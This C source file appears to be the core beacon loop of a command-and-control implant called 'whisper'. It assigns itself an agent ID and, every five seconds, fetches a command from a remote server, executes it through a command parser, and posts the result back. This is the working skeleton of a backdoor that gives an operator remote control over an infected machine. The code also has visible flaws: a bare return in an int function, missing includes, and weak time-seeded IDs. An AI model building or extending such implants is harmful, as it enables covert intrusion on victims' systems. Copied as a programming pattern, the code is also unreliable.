// core, simple with basic control flow.
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <time.h>
#include "whisper_config.h"
#include "whisper_commands.h"
#include "whisper_json.h"
#include "comms_http.h"

int execute(char * agent_id);
void generate_uuid4(char* agent_id);

int main() {
    DEBUG_LOG("STARTING");

    char agent_id[37];
    generate_uuid4(agent_id);

    //initialize_critical_sections();

    // Example of setting the execution mode (you can do this at any point in your code)
    //set_execution_mode(EXEC_MODE_SYNC);  // Initially run synchronously

    while (1) {
        //execution_setup(agent_id); // Call the command execution function
        execute(agent_id);

        //WhisperSleep(get_sleep_time());
        //Sleep is in MS, so we take the input of sleep time * 1000 to get seconds
        //WhisperSleep(1000 * get_sleep_time());
        sleep(5);

    }

    return 0;
}


// Thread function for executing the command 
int execute(char * agent_id)
{
    
    //this fills in the command, arg and command_id
    InboundJsonDataStruct InboundJsonData = get_command_data(agent_id);
    //this populates the new structure with the agent_uuid
    InboundJsonData.agent_id = agent_id;

    if (!InboundJsonData.command) {
        DEBUG_LOG("Could not get command");
        return;
    }

    DEBUG_LOG("Decoded Command: %s\n", InboundJsonData.command);

    //go ahead and setup our struct for outbound comms
    //using calloc for init on the values here
    OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));
    if (!OutboundJsonData) {
        DEBUG_LOG("Memory allocation failed for OutboundJsonData.\n");
        return 1;
    }

    // Assign UUID
    OutboundJsonData->agent_id = strdup(agent_id); // Allocates memory and copies the string. Previous strncpy_s only copied, not allocated. Need to free
    OutboundJsonData->command_result_data = NULL;

    // Parse command and modify OutboundJsonData
    parse_command(InboundJsonData.command, InboundJsonData.args, OutboundJsonData);

    DEBUG_LOG("UUID: %s\n", OutboundJsonData->agent_id);
    DEBUG_LOG("COMMAND_ID: %s\n", InboundJsonData.command_id);
    DEBUG_LOG("command_result_data: %s\n", OutboundJsonData->command_result_data ? OutboundJsonData->command_result_data : "NULL");

    // Convert to JSON and send
    char* encoded_json_response = encode_json(OutboundJsonData->agent_id, OutboundJsonData->command_result_data, InboundJsonData.command_id);
    post_data(encoded_json_response, agent_id);

    // free allocated memory
    //need to double check this

    free(InboundJsonData.command);    // Allocated in decode_command_json
    free(InboundJsonData.command_id); // Allocated in decode_command_json
    free(InboundJsonData.args);       // Allocated in decode_command_json (if applicable)

    //Outbound freeing. Only need to free if using a func that allocates memory to a strucutre member
    free(OutboundJsonData->agent_id); //freed due to 'OutboundJsonData->agent_id = strdup(agent_id);' line.
    free(OutboundJsonData->command_result_data); //freeing due to set_response_data function in whipser_commands.h
    free(OutboundJsonData); // freeing the strucutre itself: 'OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));'


    return 0;
}




void generate_uuid4(char* uuid) {
    uint8_t bytes[16];

    // Seed the random number generator
    srand((unsigned int)time(NULL));

    // Generate 16 random bytes
    for (int i = 0; i < 16; i++) {
        bytes[i] = rand() % 256;
    }

    // Set the version to 4 --> 0100
    bytes[6] = (bytes[6] & 0x0F) | 0x40;

    // Set the variant to 10xxxxxx
    bytes[8] = (bytes[8] & 0x3F) | 0x80;

    // Format UUID as a string (37 characters: 36 + null terminator)
    snprintf(uuid, 37,
        "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        bytes[0], bytes[1], bytes[2], bytes[3],
        bytes[4], bytes[5],
        bytes[6], bytes[7],
        bytes[8], bytes[9],
        bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15]
    );
}